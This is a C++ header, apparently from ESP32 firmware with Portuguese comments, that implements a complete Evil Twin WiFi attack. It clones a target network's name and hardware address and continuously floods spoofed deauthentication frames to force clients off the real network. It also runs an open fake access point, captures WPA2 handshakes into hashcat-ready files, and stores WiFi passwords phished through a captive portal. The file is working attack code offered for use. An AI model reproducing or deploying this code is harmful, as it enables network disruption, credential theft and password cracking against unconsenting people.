#pragma once
#include <Arduino.h>
#include <WiFi.h>
#include <esp_wifi.h>
#include <LittleFS.h>
#include <vector>
#include "../utils/logger.h"
#include "../config.h"

/*
 * Evil Twin Attack — AP falso com portal cativo para captura de credenciais WPA2
 *
 * Fluxo:
 *  1. Clona SSID/BSSID do AP alvo (APClone)
 *  2. Deautha clientes do AP real continuamente (forçando desconexão)
 *  3. Sobe AP falso com mesmo SSID (sem senha) para atrair clientes
 *  4. Captura handshakes WPA2 (4-way / PMKID) via sniffer promíscuo
 *  5. Serve portal cativo HTTP que pede senha do WiFi ("Atualização necessária")
 *  6. Valida senha recebida tentando conectar ao AP real
 *  7. Se válida → salva + loga + para ataque
 *
 * Paralelo: também captura PMKID do frame EAPOL-1 para cracking offline.
 */
class EvilTwin {
public:
    static EvilTwin& get() { static EvilTwin inst; return inst; }

    struct Config {
        char ssid[33]  = {};
        uint8_t bssid[6] = {};
        uint8_t channel  = 1;
        bool    deauthLoop = true;   // deauth contínuo do AP real
        bool    captureHS  = true;   // captura handshakes EAPOL
        bool    validatePw = true;   // testa senha capturada no AP real
    };

    // Credencial capturada pelo portal cativo
    struct Credential {
        String ssid, password, ip;
        unsigned long ts = 0;
    };

    Config cfg;
    bool   running      = false;
    String capturedPass = "";
    bool   passValidated = false;
    std::vector<String>     attempts;    // todas tentativas recebidas
    std::vector<Credential> captured;    // alias compatível com server.h

    // Alias para server.h
    String clonedSSID = "";

    // Adiciona credencial manualmente (chamado pelo portal do server.h)
    void addCred(const String& ssid, const String& pw, const String& ip = "") {
        if (pw.length() < 8) return;
        Credential c; c.ssid = ssid; c.password = pw; c.ip = ip; c.ts = millis();
        captured.push_back(c);
        attempts.push_back(pw);
        LOG.warn("[EvilTwin] Credencial via portal: \"" + ssid + "\" / \"" + pw + "\"");
        if (pw.length() > 0) { capturedPass = pw; saveCaptures(); }
    }

    // Estrutura para armazenar handshake capturado
    struct Handshake {
        uint8_t apMac[6];
        uint8_t clMac[6];
        uint8_t anonce[32];
        uint8_t snonce[32];
        uint8_t mic[16];
        uint8_t eapolData[256];
        uint16_t eapolLen;
        bool    hasAnonce = false;
        bool    hasSnonce = false;
        bool    hasMic    = false;
    };
    std::vector<Handshake> handshakes;

    // ── Controle ──────────────────────────────────────────────────────────────

    // Sobrecargas para compatibilidade com wifite_mode.h e server.h
    void start(const String& ssid, uint8_t ch, bool deauthLoop = true, bool captureHS = true) {
        uint8_t zeroBssid[6] = {};
        start(ssid.c_str(), zeroBssid, ch, deauthLoop, captureHS);
    }
    void start(const char* ssid, uint8_t ch, bool deauthLoop = true, bool captureHS = true) {
        uint8_t zeroBssid[6] = {};
        start(ssid, zeroBssid, ch, deauthLoop, captureHS);
    }

    void start(const char* ssid, const uint8_t* bssid, uint8_t ch,
               bool deauthLoop = true, bool captureHS = true) {
        if (running) stop();
        strncpy(cfg.ssid, ssid, 32); cfg.ssid[32] = 0;
        clonedSSID = String(ssid);
        memcpy(cfg.bssid, bssid, 6);
        cfg.channel    = ch;
        cfg.deauthLoop = deauthLoop;
        cfg.captureHS  = captureHS;
        capturedPass   = "";
        passValidated  = false;
        attempts.clear();
        handshakes.clear();

        _startFakeAP();
        if (cfg.captureHS) _startSniffer();
        running = true;
        LOG.warn("[EvilTwin] Iniciado — alvo: \"" + String(ssid) + "\" ch" + String(ch));
    }

    void stop() {
        running = false;
        esp_wifi_set_promiscuous(false);
        WiFi.softAPdisconnect(true);
        LOG.info("[EvilTwin] Parado. Tentativas: " + String(attempts.size()) +
                 " | Handshakes: " + String(handshakes.size()));
    }

    void tick() {
        if (!running) return;
        // Deauth agressivo: 20 frames a cada 200ms (~100 frames/s)
        if (cfg.deauthLoop && millis() - _lastDeauth > 200) {
            for (int i = 0; i < 4; i++) _deauthTarget();
            _lastDeauth = millis();
        }
    }

    // Retorna JSON com status para a API
    String toJson() const {
        String j = "{\"running\":" + String(running ? "true" : "false");
        j += ",\"ssid\":\"" + String(cfg.ssid) + "\"";
        j += ",\"channel\":" + String(cfg.channel);
        j += ",\"attempts\":" + String(attempts.size());
        j += ",\"handshakes\":" + String(handshakes.size());
        j += ",\"capturedPass\":\"" + capturedPass + "\"";
        j += ",\"passValidated\":" + String(passValidated ? "true" : "false");
        j += "}";
        return j;
    }

    // Salva credenciais capturadas em LittleFS
    void saveCaptures() {
        if (!LittleFS.begin(false)) return;
        File f = LittleFS.open("/captures/evil_twin.txt", "a");
        if (!f) return;
        for (auto& a : attempts) {
            f.print(String(cfg.ssid) + "\t" + a + "\n");
        }
        f.close();
    }

private:
    unsigned long _lastDeauth = 0;
    static EvilTwin* _inst;

    // ── Fake AP ───────────────────────────────────────────────────────────────

    void _startFakeAP() {
        // AP aberto com mesmo SSID — clientes se conectam automaticamente
        WiFi.mode(WIFI_AP_STA);
        esp_wifi_set_channel(cfg.channel, WIFI_SECOND_CHAN_NONE);

        // Tentar spoof do BSSID (funciona em algumas versões do SDK)
        esp_wifi_set_mac(WIFI_IF_AP, cfg.bssid);

        WiFi.softAP(cfg.ssid, nullptr, cfg.channel, 0, 8); // sem senha, max 8 clientes
        WiFi.softAPConfig(
            IPAddress(192,168,4,1),
            IPAddress(192,168,4,1),
            IPAddress(255,255,255,0)
        );
        LOG.info("[EvilTwin] AP falso ativo: \"" + String(cfg.ssid) +
                 "\" IP=192.168.4.1 ch=" + String(cfg.channel));
    }

    // ── Sniffer para captura de handshake EAPOL/PMKID ─────────────────────────

    void _startSniffer() {
        _inst = this;
        esp_wifi_set_promiscuous(true);
        esp_wifi_set_promiscuous_rx_cb([](void* buf, wifi_promiscuous_pkt_type_t type) {
            if (type != WIFI_PKT_DATA) return;
            auto* pkt = (wifi_promiscuous_pkt_t*)buf;
            if (_inst) _inst->_processFrame(pkt->payload, pkt->rx_ctrl.sig_len);
        });
    }

    void _processFrame(const uint8_t* data, uint16_t len) {
        if (len < 24) return;
        const uint8_t* addr1 = data + 4;
        const uint8_t* addr2 = data + 10;
        const uint8_t* addr3 = data + 16;
        // Se bssid zerado (iniciado via wifite sem BSSID), aceita todo EAPOL
        const uint8_t zero[6] = {};
        bool bssidUnset = (memcmp(cfg.bssid, zero, 6) == 0);
        if (!bssidUnset) {
            bool toAP   = memcmp(addr1, cfg.bssid, 6) == 0;
            bool fromAP = memcmp(addr2, cfg.bssid, 6) == 0 ||
                          memcmp(addr3, cfg.bssid, 6) == 0;
            if (!toAP && !fromAP) return;
        }

        // Procura EAPOL (LLC snap: AA AA 03 00 00 00 88 8E)
        if (len < 36) return;
        const uint8_t snap[] = {0xAA, 0xAA, 0x03, 0x00, 0x00, 0x00, 0x88, 0x8E};
        for (uint16_t i = 24; i + 8 <= len; i++) {
            if (memcmp(data + i, snap, 8) == 0) {
                _parseEAPOL(data, len, i + 8, addr1, addr2);
                return;
            }
        }

        // PMKID: está no EAPOL-1 nos primeiros 16 bytes após o MIC
        // (já capturado dentro do _parseEAPOL)
    }

    void _parseEAPOL(const uint8_t* data, uint16_t len,
                      uint16_t eapolOff, const uint8_t* addr1, const uint8_t* addr2) {
        if (eapolOff + 95 > len) return; // EAPOL mínimo para 4-way
        const uint8_t* eapol = data + eapolOff;
        // eapol[0] = version, [1] = type (3=key), [2:3] = length
        if (eapol[1] != 0x03) return; // not key

        uint8_t keyInfo1 = eapol[5], keyInfo2 = eapol[6];
        bool ack = (keyInfo1 & 0x80) != 0;    // Key ACK bit
        bool mic = (keyInfo2 & 0x01) != 0;    // MIC bit

        // Encontra ou cria entrada de handshake para este par AP/cliente
        const uint8_t* apMac = ack ? addr2 : addr1;  // AP envia Msg1 (ACK=1, MIC=0)
        const uint8_t* clMac = ack ? addr1 : addr2;
        Handshake* hs = _findOrCreate(apMac, clMac);
        if (!hs) return;

        if (ack && !mic) {
            // Mensagem 1: ANonce
            memcpy(hs->anonce, eapol + 17, 32);
            hs->hasAnonce = true;
            // PMKID está nos últimos 16 bytes do frame Msg1 se presente
            // (RSN IE no final do frame de associação — aqui capturamos o ANonce)
            LOG.info("[EvilTwin] EAPOL Msg1 (ANonce) de " + _macStr(apMac));
        } else if (!ack && mic) {
            // Mensagem 2: SNonce + MIC → handshake completo!
            memcpy(hs->snonce, eapol + 17, 32);
            hs->hasSnonce = true;
            memcpy(hs->mic, eapol + 81, 16);
            hs->hasMic = true;
            uint16_t elen = (eapol[2] << 8) | eapol[3];
            if (elen > 256) elen = 256;
            memcpy(hs->eapolData, eapol, elen);
            hs->eapolLen = elen;
            LOG.success("[EvilTwin] Handshake EAPOL completo! AP=" + _macStr(apMac) +
                        " Cliente=" + _macStr(clMac));
            _saveHandshake(*hs);
        }
    }

    Handshake* _findOrCreate(const uint8_t* apMac, const uint8_t* clMac) {
        for (auto& h : handshakes)
            if (memcmp(h.apMac, apMac, 6) == 0 && memcmp(h.clMac, clMac, 6) == 0)
                return &h;
        if (handshakes.size() >= 32) return nullptr;
        Handshake h;
        memcpy(h.apMac, apMac, 6);
        memcpy(h.clMac, clMac, 6);
        handshakes.push_back(h);
        return &handshakes.back();
    }

    void _saveHandshake(const Handshake& hs) {
        if (!LittleFS.begin(false)) return;
        LittleFS.mkdir("/captures");
        String fname = "/captures/hs_" + String(cfg.ssid) + ".hc22000";
        File f = LittleFS.open(fname, "a");
        if (!f) return;
        // Formato hc22000: WPA*02*MIC*APMAC*CLIENTMAC*SSID*ANONCE*EAPOL*
        char line[600] = {};
        snprintf(line, sizeof(line),
            "WPA*02*%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x"
            "*%02x%02x%02x%02x%02x%02x*%02x%02x%02x%02x%02x%02x*",
            hs.mic[0],hs.mic[1],hs.mic[2],hs.mic[3],
            hs.mic[4],hs.mic[5],hs.mic[6],hs.mic[7],
            hs.mic[8],hs.mic[9],hs.mic[10],hs.mic[11],
            hs.mic[12],hs.mic[13],hs.mic[14],hs.mic[15],
            hs.apMac[0],hs.apMac[1],hs.apMac[2],
            hs.apMac[3],hs.apMac[4],hs.apMac[5],
            hs.clMac[0],hs.clMac[1],hs.clMac[2],
            hs.clMac[3],hs.clMac[4],hs.clMac[5]);
        f.print(line);
        // SSID hex
        for (size_t i = 0; i < strlen(cfg.ssid); i++)
            f.printf("%02x", (uint8_t)cfg.ssid[i]);
        f.print("*");
        for (int i = 0; i < 32; i++) f.printf("%02x", hs.anonce[i]);
        f.print("*");
        for (int i = 0; i < hs.eapolLen; i++) f.printf("%02x", hs.eapolData[i]);
        f.print("*\n");
        f.close();
        LOG.success("[EvilTwin] Handshake salvo: " + fname);
    }

    // ── Deauth do AP real ─────────────────────────────────────────────────────

    void _deauthTarget() {
        esp_wifi_set_channel(cfg.channel, WIFI_SECOND_CHAN_NONE);
        const uint8_t bcast[6] = {0xFF,0xFF,0xFF,0xFF,0xFF,0xFF};
        // Varia reason codes para cobrir mais drivers de cliente
        static const uint8_t reasons[] = {0x01,0x02,0x03,0x07,0x08};
        static uint8_t ri = 0;
        uint8_t reason = reasons[(ri++) % 5];

        // AP → broadcast (desconecta todos clientes)
        uint8_t frame[26] = {};
        frame[0] = 0xC0; frame[1] = 0x00;
        frame[2] = 0x3A; frame[3] = 0x01;
        memcpy(frame + 4,  bcast,     6); // DA
        memcpy(frame + 10, cfg.bssid, 6); // SA = AP real (spoofado)
        memcpy(frame + 16, cfg.bssid, 6); // BSSID
        frame[24] = reason; frame[25] = 0x00;
        esp_wifi_80211_tx(WIFI_IF_AP, frame, 26, false);

        // Disassoc broadcast também (força estado ASSOC=0)
        frame[0] = 0xA0;
        esp_wifi_80211_tx(WIFI_IF_AP, frame, 26, false);
    }

    // ── Utilidades ─────────────────────────────────────────────────────────────

    static String _macStr(const uint8_t* m) {
        char s[18];
        snprintf(s, sizeof(s), "%02X:%02X:%02X:%02X:%02X:%02X",
                 m[0],m[1],m[2],m[3],m[4],m[5]);
        return String(s);
    }
};

inline EvilTwin* EvilTwin::_inst = nullptr;
